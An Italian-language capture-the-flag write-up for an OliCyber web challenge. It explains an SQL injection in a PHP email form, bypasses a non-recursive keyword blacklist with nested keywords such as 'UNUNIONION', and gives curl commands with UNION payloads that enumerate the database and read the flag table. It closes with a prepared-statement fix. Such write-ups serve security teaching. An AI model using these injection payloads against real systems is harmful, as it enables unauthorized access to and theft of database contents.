# If you have no time, just don't wait

**Competizione:** OliCyber <br>
**Categoria:** Web <br>
**URL:** http://no-time.challs.olicyber.it

---

## Descrizione
>Questo sito promette di darmi una flag, ma dovrei aspettar troppo tempo...

Un sito "Coming Soon" con un form per iscriversi via email. Il backend inserisce la mail in un database MySQL e la flag si trova in una tabella nascosta.

---

## Soluzione

### 1. Ricognizione iniziale

Il sorgente è disponibile su `database.php?show_source`. La query è:

```php
$query = "SELECT email FROM emails WHERE email = '$email'";
```

Input utente inserito direttamente nella query → **SQL Injection**.

### 2. Vulnerabilità — SQLi con blacklist bypassabile

Il backend applica una blacklist con `preg_replace`:

```php
$blacklist = array('SELECT','INSERT','UNION','DELETE','ALL','WHERE','FROM','FLAG','LIMIT','OFFSET');
foreach ($blacklist as $blocked){
    $email = preg_replace("/$blocked/i", '', $email);
}
```

**Bypass:** inserendo la keyword bloccata dentro sé stessa, dopo la rimozione rimane la keyword originale:

| Input | Dopo sanitize |
|-------|--------------|
| `UNUNIONION` | `UNION` |
| `SESELECTLECT` | `SELECT` |
| `FRFROMOM` | `FROM` |
| `WHERWHEREE` | `WHERE` |
| `flFLAGag` | `flag` |

Per `flag` nei nomi di tabella/colonna serve il bypass `flFLAGag` (inserisce `FLAG` maiuscolo in mezzo che viene rimosso lasciando `flag`).

### 3. Exploit

**Step 1 — Enumera le tabelle:**

```bash
curl -s -X POST "http://no-time.challs.olicyber.it/database.php" \
  -d "email=' AND 1=2 UNUNIONION SESELECTLECT group_concat(table_name) FRFROMOM information_schema.tables-- -"
```

Risultato: `emails, qua_trovi_la_tua_flag, ...`

**Step 2 — Enumera le colonne (hex per evitare problemi con le virgolette):**

```bash
curl -s -X POST "http://no-time.challs.olicyber.it/database.php" \
  -d "email=' AND 1=2 UNUNIONION SESELECTLECT group_concat(column_name) FRFROMOM information_schema.columns WHERWHEREE table_name=0x7175615f74726f76695f6c615f7475615f666c6167-- -"
```

Risultato: `la_flag_sta_qua`

**Step 3 — Leggi la flag (bypass `flag` con `flFLAGag`, backtick per nome tabella):**

```bash
curl -s -X POST "http://no-time.challs.olicyber.it/database.php" \
  -d "email=' AND 1=2 UNUNIONION SESELECTLECT la_flFLAGag_sta_qua FRFROMOM \`qua_trovi_la_tua_flFLAGag\`-- -"
```

---

## Flag

```
flag{...}
```

---

## Conclusioni

La blacklist basata su `preg_replace` è bypassabile con keyword annidate. La rimozione è applicata una sola volta e non ricorsivamente, quindi basta inserire la keyword bloccata dentro sé stessa per ricostruirla dopo la sanitizzazione.

**Fix corretto:** usare prepared statements con `PDO::prepare()` e `bindParam()` per tutti i parametri utente, mai costruire query per concatenazione di stringhe.